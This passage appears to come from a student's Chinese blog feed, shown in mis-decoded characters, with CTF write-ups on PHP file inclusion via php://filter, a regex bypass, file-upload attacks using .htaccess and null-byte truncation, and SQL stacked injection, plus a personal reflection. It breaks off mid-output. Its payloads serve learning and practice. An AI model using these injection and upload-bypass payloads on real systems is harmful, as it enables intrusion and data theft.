37</p><p>æ³¨æ„includeï¼Œæ‰€ä»¥åº”è¯¥æ˜¯æ–‡ä»¶åŒ…å«ï¼Œå°è¯•ä¼ªåè®®è¯»å–ï¼Œç›´æ¥è¯»flagã€‚phpä¸è¡Œï¼Œè®°å¾—æœ‰ä¸€é“é¢˜ï¼Œæ˜¯æœ¬æ¥è¯»å–Flagï¼Œä½†æ˜¯è¯»ä¸äº†ï¼Œæ‰€ä»¥è¯»å–äº†indexï¼Œæ‰€ä»¥å°è¯•ä¸€ä¸‹</p><?php                $file = $_GET['category'];                if(isset($file))                {                    if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){                        include ($file . '.php');                    }                    else{                        echo "Sorry, we currently only support woofers and meowers.";                    }                }                ?><p>åªæ˜¯æç¤ºå¯ä»¥è¾“å…¥indexï¼Œwoofersï¼Œmeowers</p><p>../?è¯•è¯•</p><p>å¯¹äº†è¿™æ˜¯åœ¨åé¢ä¸åŠ .php,æ³¨é‡Šç¬¦å¯ä»¥å—ï¼Œæ²¡æœ‰ç”¨</p><p>%00è™½ç„¶æˆåŠŸæˆªæ–­ï¼Œä½†æ˜¯ä¼šæŠ¥é”™è¯¯</p><p>include æ–‡ä»¶åŒ…å«ç‰¹æ€§ï¼Œå°è¯•?category=woofers/../flag,å‘ç°f12è¯´åˆ°ï¼Œcan you read this flag?ï¼Œå°±æ˜¯æ–‡ä»¶åŒ…å«ï¼Œè¿™é‡Œæ˜¯phpï¼›//filter<br>åœ°ä¸€ä¸ªå°æŠ€å·§ï¼ŒåµŒå¥—æ–‡ä»¶</p><p>?category=php://filter/read=convert.encode-base64/index|woofers|meowers/resource=flag,å°±æ˜¯åˆ©ç”¨<code>php://filterä¼ªåè®®å¯ä»¥å¥—ä¸€å±‚åè®®</code>è¿›è¡Œè¯»å–</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç³—å›¾ç™¾ç§‘python</title>
      <link href="/2021/03/05/%E7%B3%97%E5%9B%BE%E7%99%BE%E7%A7%91python/"/>
      <url>/2021/03/05/%E7%B3%97%E5%9B%BE%E7%99%BE%E7%A7%91python/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><img src="1.PNG"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>veryphp</title>
      <link href="/2021/03/05/veryphp/"/>
      <url>/2021/03/05/veryphp/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>é¢˜ç›®æºç </p><p><img src="1.jpg"></p><p>è¿™é“é¢˜æˆ‘æœ¬æ¥æƒ³çš„æ˜¯strå»è°ƒç”¨ç±»classï¼Œä½†æ˜¯æ²¡æ³•å»æ‰ï¼Œå¹¶ä¸”extractè¿™ä¸ªå‡½æ•°ï¼Œä»¥å‰åšå˜é‡è¦†ç›–çš„æ—¶å€™é‡è§è¿‡ï¼Œå®ƒæ˜¯æŠŠè¾“å…¥çš„å­—ç¬¦ä¸²å˜ä¸ºæ•°ç»„ï¼Œå¦‚æœæœ‰å·²ç»å­˜åœ¨çš„å˜é‡ï¼Œå°±è¦†ç›–å®ƒçš„å€¼ï¼Œå®ƒå¹¶ä¸å…·å¤‡å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœï¼Œæ‰€ä»¥strè¿™é‡Œï¼Œå¯¹è§£ç­”é¢˜ç›®æ²¡æœ‰å¸®åŠ©</p><p>çœ‹shaw_rootï¼Œå®ƒæ˜¯ä¸€ä¸ªæ­£åˆ™åŒ¹é…ï¼Œå¦‚æœåŒ¹é…ä¹‹è·¯ï¼Œåˆ™è¾“å…¥hint</p><p>/^-[a-e][^a-zA-Z0-8]&lt;b&gt;(.<em>)&gt;{4}\D</em>?(abc.*?)p(hp)*@R(s|r).$/â€˜</p><p>è¿™é‡Œæœ‰ä¸€ä¸ªæ­£åˆ™åŒ¹é…çš„ç½‘ç«™</p><p><a href="https://regex101.com/">https://regex101.com/</a></p><p>æ¥åˆ†æ</p><p>^è¦ä»¥-å¼€å¤´ï¼Œsæˆ–rç»“å°¾</p><p>ã€a-eã€‘ï¼Œå¯ä»¥è¾“å…¥a|b|c|d|e,æœ€å¤šåŒ¹é…ä¸€æ¬¡</p><p>ã€^a-zA-Z0-8ã€‘,åŒ¹é…é™¤äº†a-zA-Z0-8ä»¥å¤–çš„ï¼Œå°±æ˜¯9</p><p>&lt;b&gt;è¾“å…¥&lt;b&gt;</p><p>(.*)åŒ¹é…ä»»æ„å­—ç¬¦ä»»æ„æ¬¡</p><blockquote><p>{4}è¾“å…¥4ä¸ª&gt;</p></blockquote><p>\D*?å¯æœ‰å¯æ— </p><p>(abc.*?)éè´ªå©ªæ¨¡å¼ï¼ŒåŒ¹é…ä¸€æ¬¡ï¼Œabc</p><p>p:p</p><p>(hp)*,åŒ¹é…ä»»æ„å¤šæ¬¡</p><p>@ï¼š@</p><p>ï¼ˆs|rï¼‰:sæˆ–r</p><p>å› ä¸ºè¿˜è¦æ§åˆ¶å½“éƒ½æ˜¯29ï¼š-a9&lt;b&gt;1&gt;&gt;&gt;&gt;abcphphphphphp@Rsr</p><p>è¿˜æœ‰å¾ˆå¤š<br>å°±æ˜¯(.*)å¯æ§ã€‚(hp)*å¯æ§</p><p>è¿˜æœ‰å› ä¸ºè¿‡æ»¤äº†<em>,æ‰€ä»¥æˆ‘ä»¬è¾“å…¥ä¸äº†show_root,ä½†æ˜¯ï¼Œå‰ä¸€æ®µæ—¶é—´åšpreg_matchçš„æ—¶å€™ï¼Œæˆ‘ä»¬å­¦åˆ°äº†ä¸€ä¸ªçŸ¥è¯†åœ¨æœåŠ¡å™¨ä¸­è¾“å…¥.|+|[|ä¼šè¢«è§£æä¸º</em>,æ‰€ä»¥æˆ‘ä»¬è¾“å…¥show[root</p><p><img src="3.PNG"></p><p>å°±æ˜¯å‘ç°ï¼Œä¸æ˜¯bpä¸å¥½ç”¨å°±æ˜¯postä¸å¥½ç”¨ï¼ŒçœŸçš„æ˜¯æ— è¯­äº†</p><p><img src="2.jpg"></p><p>çœ‹è¿™é‡Œï¼Œåœ¨çœ‹è¿™é‡Œ</p><p><img src="3.jpg"></p><p>å¦‚æœans==Secretnumberï¼Œé‚£ä¹ˆå°±æ˜¯ä½¿ç”¨call_user_funcè¿™ä¸ªå‡½æ•°</p><p>å®ƒå¯ä»¥åœ¨ç±»å¤–è°ƒç”¨é™æ€çš„æ–¹æ³•</p><p>æœ€å</p><p><img src="2.PNG"></p><p>å¬è¯´ä¸‹å‘¨è¦æœ‰ä¸ªæµ‹è¯•ï¼Œçªç„¶ç‰¹åˆ«ç´§å¼ ï¼Œè™½ç„¶çŸ¥é“æ˜¯ä¸€å®šè¦è¿›è¡Œæ¯”èµ›çš„ã€‚</p><p>ç¬¬ä¸€æ¬¡ï¼Œä¸“ä¸šæŒ‡å¯¼è¯¾çš„æ—¶å€™ï¼Œå‚è§‚äº†ä¿¡æ¯å®‰å…¨å®éªŒå®¤ï¼Œå¬å­¦é•¿ä»‹ç»è¯´ï¼Œå¯ä»¥æ‰“æ”»é˜²ä»€ä¹ˆä»€ä¹ˆä¹‹ç±»çš„ï¼Œå°±æ„Ÿåˆ°ååˆ†æ„Ÿå…´è¶£ï¼Œå°±åŠ äº†å®éªŒå®¤çš„ç¾¤ã€‚å½“å¬è¯´è¦æ‹›æ–°æ¯”èµ›çš„æ—¶å€™ï¼Œæˆ‘æƒ³ä¸åŠ äº†å§ï¼Œå› ä¸ºæˆ‘å¾ˆæ‡’ï¼ŒåŠ å®éªŒå®¤äº‹æƒ…å¤šï¼Œè¿˜è¦å‡†å¤‡æ‹›æ–°æ¯”èµ›ï¼Œå°±ä¸æƒ³åŠ å…¥ã€‚ç¾¤é‡Œçš„æ¶ˆæ¯æ²¡æœ‰çœ‹è¿‡ï¼Œæ˜çŸ¥é“æœ‰ä¸€åœºç›´æ’­ï¼Œä¹Ÿç»™è‡ªå·±æ‰¾ååˆ†æ°å½“çš„ç†ç”±ä¸å»çœ‹ã€‚</p><p>æ‹›æ–°æ¯”èµ›å¼€å§‹çš„é‚£å¤©ï¼Œçœ‹ç¾¤é‡Œè¯´è°åšäº†å¤šå°‘åˆ†çš„é¢˜ï¼Œæ’åç¬¬å‡ ï¼Œå½“æ—¶æˆ‘æœ‰ç‚¹å¿ƒåŠ¨ã€‚ç¬¬äºŒå¤©ï¼Œæˆ‘æŠ±ç€ä¸€ç§å¿ƒç†ï¼Œæˆ‘é—®å­¦é•¿æ˜¯ä¸æ˜¯æ¯”èµ›å¼€å§‹ç¬¬äºŒå¤©å°±ä¸èƒ½æŠ¥åäº†ï¼Œæˆ‘æƒ³çš„æ˜¯å¦‚æœä¸èƒ½ï¼Œæˆ‘å°±ç»™äº†æˆ‘è‡ªå·±ä¸€ä¸ªå……åˆ†çš„ç†ç”±ä¸å»åŠ å…¥ã€‚ä½†æ˜¯å­¦é•¿è¯´å¯ä»¥ã€‚æ‰€ä»¥æˆ‘å°±å¼€å§‹äº†ï¼Œæ²¡æœ‰ä¸€ç‚¹ç‚¹å‡†å¤‡</p><p>æœ€å¼€å§‹çš„æ—¶å€™ï¼Œæˆ‘ä»æœªæ¥è§¦ctfï¼Œctfæ˜¯ä»€ä¹ˆéƒ½ä¸çŸ¥é“ï¼Œæœ€åŸºæœ¬çš„åšé¢˜æ€è·¯éƒ½æ²¡æœ‰ï¼Œå®Œå…¨å°±æ˜¯çåšï¼Œæµªè´¹äº†å¥½é•¿æ—¶é—´ï¼Œä¹Ÿæ²¡åšå‡ºæ¥å¤šå°‘åˆ†ã€‚</p><p>æˆ‘èº«ä¸Šæœ€å¤§çš„ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯åšä¸€ä»¶äº‹æƒ…ä¸èƒ½å…¨èº«å¿ƒçš„æŠ•å…¥ï¼Œæ€¥äºæ±‚æˆï¼Œå¾€å¾€å•¥ä¹Ÿä¸æ˜¯ã€‚æ‹›æ–°çš„æ—¶å€™ï¼Œæ€»æƒ³ç€æ€ä¹ˆæŠŠé¢˜ç›®åœ¨ç½‘ä¸Šæœå‡ºç±»ä¼¼çš„è¿›è¡Œæ¨¡ä»¿è§£ç­”ï¼Œå´å¯¹çŸ¥è¯†äº†è§£çš„å¾ˆå°‘ï¼Œé‚£æ®µæ—¶é—´å¾ˆæ˜¯ä¸å¼€å¿ƒï¼Œç¬¬ä¸€æ¬¡æ„Ÿåˆ°ååˆ†çš„æŒ«è´¥ã€‚åšåˆ°2000å¤šåˆ†çš„æ—¶å€™ï¼Œæƒ³è¿‡æ”¾å¼ƒï¼Œä½†æ˜¯åšæŒä½äº†ã€‚</p><p>è¿‡äº†åˆè¯•</p><p>å¯’å‡</p><p>è¿™ä¸ªå‡æœŸè¿‡å¾—è¿˜ç®—å……å®ï¼Œåœ¨å‡æœŸé‡Œæƒ³è¦æ˜¯æ²¡æœ‰åŠ å…¥å®éªŒå®¤ï¼Œæˆ‘å¯èƒ½æ¯å¤©éƒ½åœ¨ç©æ‰‹æœºï¼Œæ— æ‰€äº‹äº‹ï¼Œä½†ç°åœ¨æˆ‘è‡³å°‘è¿˜æœ‰è‡ªå·±æƒ³è¦å®Œæˆçš„ä¸œè¥¿</p><p>æˆ‘é€æ¸æ…¢æ…¢çš„æ”¹å˜è‡ªå·±ï¼Œå…ˆäº†è§£çŸ¥è¯†ï¼Œåæ…¢æ…¢è§£ç­”ï¼Œå­¦çš„å¤šï¼Œå¿˜è®°çš„ä¹Ÿå¤šï¼Œæˆ‘ç°åœ¨èƒ½åšå‡ºæ¥ä¸€ç‚¹ç®€å•çš„é¢˜ç›®ï¼ˆç»å¤§éƒ¨åˆ†è¿˜æ˜¯ä¸èƒ½è‡ªå·±å®Œæˆï¼‰ï¼Œèƒ½çœ‹æ‡‚ç®€å•çš„phpä»£ç ï¼Œå†™ä¸€äº›pythonè„šæœ¬ï¼Œæ˜¨å¤©ï¼Œå¬å®Œbç«™çš„çˆ¬è™«è§†é¢‘ï¼Œå†™äº†çˆ¬å–ç½‘ç«™å›¾ç‰‡çš„è„šæœ¬ï¼Œçœ‹ç€ä¸€å¼ å¼ ä¸‹è½½ä¸‹æ¥çš„å›¾ç‰‡ï¼Œçªç„¶æ„Ÿè§‰ï¼ŒåŸæ¥æˆ‘ä¹Ÿæ˜¯å¯ä»¥è‡ªå·±é€¼ç€è‡ªå·±å»å®Œæˆä¸€é¡¹ä»»åŠ¡ï¼Œä¸æ˜¯åˆ«äººå¸ƒç½®çš„ä»»åŠ¡ã€‚</p><p>ç°åœ¨çš„æˆ‘æ¯”ä¹‹å‰çš„æˆ‘è¿›æ­¥äº†å°‘è®¸ï¼Œä¸çŸ¥é“æ¯”èµ›é‚£å¤©çš„æˆ‘æ˜¯æ€æ ·çš„ï¼Œä¸ç®¡åŠ å…¥ä¸å¦ï¼Œéƒ½å¾ˆå¼€å¿ƒï¼Œå¾ˆæ„Ÿè°¢è‡ªå·±è¿™ä¸€æ®µæ—¶é—´ï¼ˆè™½ç„¶ä¹Ÿæ²¡æ€ä¹ˆè¿›æ­¥ï¼‰ä¸€ç›´åšæŒï¼Œæ²¡æœ‰æ”¾å¼ƒã€‚</p><p>åŒæ—¶ï¼Œå¸Œæœ›è‡ªå·±</p><p>ä¸è¦æ€¥äºæ±‚æˆï¼Œä¸€é“é¢˜ç›®è¦ä»”ç»†å¥½å¥½çš„åæ€ï¼Œä¸ç®¡è‡ªå·±åšå‡ºæ¥ä¸å¦ï¼Œéƒ½è¦å¥½å¥½æ€»ç»“</p><p>å¦å¤–ä¸“æ³¨äºä¸€é“é¢˜ï¼Œä¸è¦ä¸‰å¿ƒäºŒæ„ï¼Œä¸€å®šå•Š</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸¤ä¸ªæ–‡ä»¶ä¸Šä¼ (ä½ ä¼ ä½ ğŸå‘¢ï¼Œcgctfæ–‡ä»¶ä¸Šä¼ )</title>
      <link href="/2021/03/04/%E4%B8%A4%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/03/04/%E4%B8%A4%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2>ç¬¬ä¸€é¢˜</h2><p>å°±æ˜¯ä¸€ä¸ªåˆ©ç”¨.htaccessæ–‡ä»¶è¿›è¡Œä¸Šä¼ çš„é¢˜ç›®ï¼Œå…ˆä¸Šä¼ .htaccessï¼Œåä¸Šä¼ a.pngï¼Œé—®é¢˜å¤„åœ¨äº†å“ªé‡Œå‘¢ï¼Œæ˜¯å› ä¸ºæˆ‘ï¼Œæœ€åè¿æ¥çš„urlæé”™äº†</p><p>/var/www/html/upload/d31b5eb9684c737c762a8c8d00d6c6df/a.png succesfully uploaded!</p><p>ä¸Šä¼ çš„è·¯å¾„æ˜¯è¿™æ ·ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ çš„urlåº”è¯¥æ˜¯ url/upload/d31b5eb9684c737c762a8c8d00d6c6df/a.png</p><p>postè¿æ¥ï¼Œä¼šå‡ºç°æŠ¥é”™ï¼Œç›´æ¥èšå‰‘è¿æ¥</p><p>åœ¨å¤ä¹ ä¸‹.htaccessï¼Œapplication/x-httpd-phpï¼Œå¯ä»¥å°†æ‰€æœ‰æ–‡ä»¶éƒ½è§£ææˆphpæ–‡ä»¶</p><h2>ç¬¬äºŒé¢˜</h2><p>é¢˜ç›®åœ°å€ï¼ˆ<a href="https://link.jianshu.com/?t=http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html%EF%BC%89">https://link.jianshu.com/?t=http%3A%2F%2Fteamxlc.sinaapp.com%2Fweb5%2F21232f297a57a5a743894a0e4a801fc3%2Findex.htmlï¼‰</a></p><h3>å‰ç½®çŸ¥è¯†</h3><li>00æˆªæ–­åŸç†<p>0x00æ˜¯å­—ç¬¦ä¸²ç»“æŸçš„æ ‡å¿—ï¼Œæˆ‘ä»¬æ‰‹åŠ¨æ·»åŠ è¿™ä¸ªæ ‡å¿—æ¥è®²åé¢çš„å†…å®¹æˆªæ–­ï¼Œè€Œåé¢çš„å†…å®¹åˆå¯ä»¥å¸®æˆ‘ä»¬ç»•è¿‡jiance</p><li>00æˆªæ–­çš„é™åˆ¶æ¡ä»¶<p>php&lt;5.3.29,ä¸”GPCå…³é—­</p><li>00æˆªæ–­çš„åˆ©ç”¨æ–¹æ³•<p>ä¸Šä¼ æ–‡ä»¶çš„åç«¯æ£€æµ‹ä»£ç </p><p><img src="1.PNG"></p><li>ç”¨æ³•<p>å¦‚æœæ”»å‡»è€…æ„é€ æ–‡ä»¶åï¼š<code>admintony.php%00a.jpg</code>ï¼Œåœ¨æå–åç¼€åçš„æ—¶å€™é‡åˆ°%00åˆ™è®¤ä¸ºå­—ç¬¦ä¸²ç»“æŸäº†ï¼Œé‚£ä¹ˆä»–æå–åˆ°çš„åç¼€åä¼šæ˜¯.phpï¼Œ.phpåç¼€åˆä¸å…è®¸ä¸Šä¼ æ‰€ä»¥ä¸Šä¼ å¤±è´¥äº†(è¿™é‡Œæœ‰å¿…è¦æä¸€å¥ï¼Œæœ‰äººå¯èƒ½ä¼šè¯´åœ¨ä¸€äº›æƒ…å†µä¸‹ï¼Œ%00æˆªæ–­æ–‡ä»¶åå¯ä»¥æˆåŠŸï¼Œè¿™ç§æ¡ˆä¾‹ä½ è¯•ä¸€ä¸‹æ˜¯ä¸æ˜¯ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œè¥¿æ™®çš„00æˆªæ–­å®éªŒå°±æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ çš„ä¸Šä¼ ç‚¹ï¼Œæ—¢ç„¶æ˜¯ä»»æ„æ–‡ä»¶ä¸Šä¼ åˆä½•å¿…ç”¨00æˆªæ–­ç»•è¿‡å‘¢ï¼Ÿ)</p><p>é‚£ä¹ˆ00æˆªæ–­åº”è¯¥åœ¨ä»€ä¹ˆæ—¶å€™ä½¿ç”¨å‘¢ï¼Ÿæ•°æ®åŒ…ä¸­å¿…é¡»å«æœ‰ä¸Šä¼ åæ–‡ä»¶çš„ç›®å½•æƒ…å†µæ‰å¯ä»¥ç”¨ï¼Œæ¯”å¦‚æ•°æ®åŒ…ä¸­å­˜åœ¨<code>path: uploads/</code>ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹pathçš„å€¼æ¥æ„é€ <code>paylod: uploads/aa.php%00</code></p><p><img src="2.png"></p><p>ç–‘é—®ï¼š</p><p>â€ƒâ€ƒä¸ºä»€ä¹ˆæ•ˆæœå›¾ä¸­æ‰“å°çš„ç»“æœå’Œé¢„æœŸä¸ç¬¦ï¼Œæ˜¯å› ä¸ºechoçš„ç‰¹æ®Šæ€§è´¨ï¼Œå®˜æ–¹è§£é‡Šçš„echoï¼š</p><p>  <img src="3.png"></p><p>â€ƒâ€ƒæ­£æ˜¯å› ä¸ºechoå¯ä»¥è¾“å‡ºå¤šä¸ªå­—ç¬¦ä¸²ï¼Œä¸€ä¸ªå­—ç¬¦ä¸²æˆªæ–­åå°±å˜æˆäº†ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¼šè¾“å‡ºåé¢çš„å†…å®¹ã€‚</p><h2>%00å’Œ%00(urldecode)</h2><p>åœ¨ç½‘ä¸Šå¸¸è§ç”¨Burpå°†æ•°æ®åŒ…ä¸­çš„%00è¿›è¡Œurldecodeçš„æ“ä½œï¼Œé‚£ä¸ºä»€ä¹ˆè¦è¿›è¡Œè¿™ä¸€ä¸ªæ“ä½œï¼Ÿç½‘ä¸Šä¹Ÿå¸¸è§ç›´æ¥æ”¾å…¥%00å°±å¯ä»¥æˆªæ–­æˆåŠŸçš„æ¡ˆä¾‹ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><li>%00(urldecode)<p>é¦–å…ˆè§£é‡Šä¸ºä»€ä¹ˆè¦è¿›è¡Œurldecodeæ“ä½œå‘¢ï¼Ÿå…¶åŸå› åœ¨äºä¸Šä¼ çš„è¡¨å•ä¸­æœ‰ä¸€ä¸ª<code>enctype</code>çš„å±æ€§ï¼Œå¹¶ä¸”éœ€è¦<code>enctype=&quot;multipart/form-data&quot; </code>(ä¸å¯¹è¡¨å•ä¸­æ•°æ®è¿›è¡Œç¼–ç )ï¼Œpathå¤§å¤šæ•°éƒ½æ˜¯å­˜æ”¾åœ¨è¡¨å•ä¸­çš„ï¼Œå› æ­¤éœ€è¦åœ¨æ•°æ®åŒ…ä¸­è¿›è¡Œurldecodeæ“ä½œä½¿%00å˜æˆå­—ç¬¦ä¸²ç»“æŸç¬¦å·ã€‚</p><li>%00â€ƒâ€ƒé‚£ä¹ˆä¸ºä»€ä¹ˆç½‘ä¸Šä¹Ÿæœ‰ç›´æ¥æ·»åŠ %00è€Œä¸è¿›è¡Œurldecodeæ“ä½œå‘¢ï¼Ÿå› ä¸ºpathä¹Ÿå¯ä»¥å­˜æ”¾åœ¨`URLæˆ–è€…Cookie`ä¸­ï¼Œè€Œåœ¨æäº¤æ•°æ®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šå¯¹æ•°æ®åšä¸€æ¬¡urldecodeçš„æ“ä½œï¼Œè€Œåˆ°æœåŠ¡ç«¯ï¼Œä¼šå¯¹æ•°æ®è¿›è¡Œä¸€æ¬¡urldecodeçš„æ“ä½œï¼Œå› æ­¤å¦‚æœpathåœ¨éenctype=multipart/form-dataçš„è¡¨å•ä¸­æˆ–`URL or Cookie`ä¸­çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥å†™%00ä¸éœ€è¦è¿›è¡ŒURLdecodeæ“ä½œï¼Œè®©æœåŠ¡ç«¯å¯¹%00è¿›è¡ŒURLè§£ç å³å¯ã€‚<p><img src="4.png"></p><p>å¼€å§‹è§£é¢˜</p><p><img src="5.png"></p><p>ä¸Šä¼ pngæ–‡ä»¶ï¼ŒbpæŠ“åŒ…</p><p><img src="6.png"></p><p>æ˜æ˜ä¸è®©ä¸Šä¼ ã€‚phpæ–‡ä»¶ï¼Œä½†æ˜¯åç¼€è¯å¿…é¡»è¦phpçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œç›¸åº”åŒ…é‡Œé¢çš„æ•°ç»„ï¼Œä»–æŠŠåç¼€åæ‘˜å‡ºæ¥äº†</p><p>ä¸è®©ä¼ phpï¼Œå´åˆphpï¼Œåªèƒ½è¿›è¡Œ%00æˆªæ–­</p><p><img src="7.PNG"></p><p>ä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰æˆåŠŸï¼Œæ‰€ä»¥æ­¤æ—¶ï¼Œå°±æŒ‰ç…§å‰ç½®çŸ¥è¯†æ‰€è¯´ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯·æ±‚å¤´æ²¡æœ‰cookieï¼Œurlä¹Ÿæ²¡æœ‰ç¼–ç çš„ç°è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„pathæ˜¯å­˜åœ¨è¡¨å•ä¸­äº†ï¼Œéœ€è¦åœ¨æ•°æ®åŒ…ä¸­è¿›è¡Œurldecodeæ“ä½œä½¿%00å˜æˆå­—ç¬¦ä¸²ç»“æŸç¬¦å·ã€‚</p><p><img src="8.png">å¾—åˆ°flag</p><p>è¿˜æœ‰æ˜¯0x00æˆªæ–­</p><p>å°è¯•</p><p><img src="9.PNG"></p><p>éšä¾¿åœ¨/uoload/a.phpå†™ä¸€ä¸ªå­—ç¬¦ï¼Œå ä¸€ä¸ªä½ç½®</p><p><img src="10.PNG"></p><p>ä¿®æ”¹hexï¼Œä¸º00</p><p>å¾—åˆ°flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>çˆ¬å–å›½å®¶è¯å“ç®¡ç†ç›‘ç£æ€»å±€ä¸­åŸºäºä¸­åäººæ°‘å…±å’Œå›½åŒ–å¦†å“ç”Ÿäº§è®¸å¯è¯</title>
      <link href="/2021/03/04/%E7%88%AC%E5%8F%96%E5%9B%BD%E5%AE%B6%E8%8D%AF%E5%93%81%E7%AE%A1%E7%90%86%E7%9B%91%E7%9D%A3%E6%80%BB%E5%B1%80%E4%B8%AD%E5%9F%BA%E4%BA%8E%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%8C%96%E5%A6%86%E5%93%81%E7%94%9F%E4%BA%A7%E8%AE%B8%E5%8F%AF%E8%AF%81/"/>
      <url>/2021/03/04/%E7%88%AC%E5%8F%96%E5%9B%BD%E5%AE%B6%E8%8D%AF%E5%93%81%E7%AE%A1%E7%90%86%E7%9B%91%E7%9D%A3%E6%80%BB%E5%B1%80%E4%B8%AD%E5%9F%BA%E4%BA%8E%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%8C%96%E5%A6%86%E5%93%81%E7%94%9F%E4%BA%A7%E8%AE%B8%E5%8F%AF%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>url=â€™<a href="http://scxk.nmpa.gov.cn:81/xk/&#39;">http://scxk.nmpa.gov.cn:81/xk/&#39;</a></p><p>å…ˆçœ‹è¿™ä¸ªurlå¯å¦è·å¾—æˆ‘ä»¬æƒ³è¦çš„æ•°æ®</p><p><img src="1.PNG"></p><p>å¯æ˜¯ç»“æœé‡Œå¹¶æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯</p><p>æ‰€ä»¥æˆ‘ä»¬æƒ³è¦çš„æ•°æ®å¾ˆæœ‰å¯èƒ½æ˜¯åŠ¨æ€åŠ è½½å‡ºæ¥çš„ï¼Œæ‰€ä»¥è€ƒè™‘ajexè¯·æ±‚ï¼ŒæŸ¥çœ‹çœŸæ­£çš„url</p><p>å¯ä»¥çœ‹å‡º<a href="http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsList%EF%BC%8C%E6%98%AFpost%E8%AF%B7%E6%B1%82%EF%BC%8C%E8%AF%B7%E6%B1%82%E4%BF%A1%E6%81%AF%E6%98%AF">http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsListï¼Œæ˜¯postè¯·æ±‚ï¼Œè¯·æ±‚ä¿¡æ¯æ˜¯</a></p><p>on=true&amp;page=1&amp;pageSize=15&amp;productName=&amp;conditionType=1&amp;applyname=&amp;applysn=</p><p><img src="2.PNG"></p><p>é‡æ–°è·å¾—æ•°æ®</p><p>é‡Œé¢é‚£ä¸ªlistï¼Œå€¼å¾—æ³¨æ„</p><p>ç›´æ¥å†™å®Œå§</p><p><img src="3.PNG"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ¯andGYCTF2020 Blacklist</title>
      <link href="/2021/03/03/Blacklist/"/>
      <url>/2021/03/03/Blacklist/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2>å¼ºç½‘æ¯</h2><p>return preg_match(â€œ/select|update|delete|drop|insert|where|./iâ€,$inject);</p><p>è¾“å…¥1â€™ or 1=1 #å¯ä»¥åˆ—å‡ºæ‰€æœ‰çš„æ•°æ®</p><p>array(2) {<br><br>  [0]=&gt;<br><br>  string(1) â€œ1â€<br><br>  [1]=&gt;<br><br>  string(7) â€œhahahahâ€<br><br>}<br></p><p>array(2) {<br><br>  [0]=&gt;<br><br>  string(1) â€œ2â€<br><br>  [1]=&gt;<br><br>  string(12) â€œmiaomiaomiaoâ€<br><br>}<br></p><p>array(2) {<br><br>  [0]=&gt;<br><br>  string(6) â€œ114514â€<br><br>  [1]=&gt;<br><br>  string(2) â€œysâ€<br><br>}</p><p>(å…¶å®ä»è¿™é‡Œçœ‹ï¼Œæ˜¯å¯ä»¥çœ‹å‡ºæ¥ï¼Œæ¯ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œç¬¬ä¸€ä¸ªæ˜¯å­—æ®µåï¼Œç¬¬äºŒä¸ªæ˜¯å­—æ®µå†…å®¹ï¼Œç„¶åæœ¬é¢˜çš„è§£é¢˜æ€è·¯å°±æ˜¯é€è¿™é‡Œå‡ºæ¥çš„ï¼Œè¿™åº”è¯¥æ˜¯ä¸€ä¸ªæ¯”è¾ƒå·§çš„æ–¹æ³•ï¼Œå¦ä¸€ä¸ªæ–¹æ³•åœ¨é¢˜ç›®çš„æœ€åè¯¦ç»†è¯´ä¸€ä¸‹)</p><p>ç„¶åè¿›è¡Œå †å æ³¨å…¥è¾“å…¥</p><p>1â€™;show tables;#</p><p>array(2) {<br><br>  [0]=&gt;<br><br>  string(1) â€œ1â€<br><br>  [1]=&gt;<br><br>  string(7) â€œhahahahâ€<br><br>}<br></p><p>array(1) {<br><br>  [0]=&gt;<br><br>  string(8) â€œFlagHereâ€<br><br>}<br><br><br>array(1) {<br><br>  [0]=&gt;<br><br>  string(5) â€œwordsâ€<br><br>}</p><p>æŸ¥çœ‹FlagHereè¡¨</p><p>array(2) {<br><br>  [0]=&gt;<br><br>  string(1) â€œ1â€<br><br>  [1]=&gt;<br><br>  string(7) â€œhahahahâ€<br><br>}<br><br><br>array(6) {<br><br>  [0]=&gt;<br><br>  string(4) â€œflagâ€<br><br>  [1]=&gt;<br><br>  string(12) â€œvarchar(100)â€<br><br>  [2]=&gt;<br><br>  string(2) â€œNOâ€<br><br>  [3]=&gt;<br><br>  string(0) â€œâ€<br><br>  [4]=&gt;<br><br>  NULL<br><br>  [5]=&gt;<br><br>  string(0) 